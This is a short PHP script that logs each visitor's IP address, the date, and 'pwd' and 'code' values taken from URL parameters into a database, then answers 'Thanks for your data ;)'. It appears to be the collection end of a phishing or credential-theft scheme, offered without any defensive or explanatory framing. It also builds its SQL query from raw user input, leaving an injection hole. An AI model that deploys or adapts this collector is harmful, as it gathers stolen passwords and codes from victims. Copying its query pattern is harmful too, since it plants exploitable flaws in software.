<?php
/* This php  */
include('db.inc.php'); # contains DB connection data

$ip = $_SERVER['REMOTE_ADDR']; # saves ip
$date = date("m-d-y h:i"); # check date
$password = @($_GET['pwd']); # get passwd

$code = @($_GET['code']); # get code

$query = "INSERT INTO data(date,ip,password,code) VALUES('$date','$ip','$password','$code')";
$exec = mysqli_query($link, $query);

echo "Thanks for your data ;)";

?> 
